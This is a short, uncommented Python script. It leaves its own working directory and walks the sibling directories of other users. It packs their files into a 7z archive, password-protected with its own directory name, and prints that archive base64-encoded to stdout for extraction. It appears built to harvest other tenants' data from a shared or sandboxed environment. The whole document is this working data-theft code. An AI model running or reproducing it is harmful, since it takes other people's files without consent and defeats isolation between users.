import os, io, zipfile, base64, py7zr
myuuid=os.getcwd().split("/")[-1]
os.chdir('..')
rzip=io.BytesIO()
with py7zr.SevenZipFile(rzip, 'w', password=myuuid.encode()) as archive:
  for user in os.listdir():
    if user in [".cache",myuuid]: continue
    for file in os.listdir(user):
      path = os.path.join(user,file)
      archive.write(path, arcname=path)
rzip.seek(0)
print(base64.b64encode(rzip.read()).decode(),myuuid,sep=";",end="")
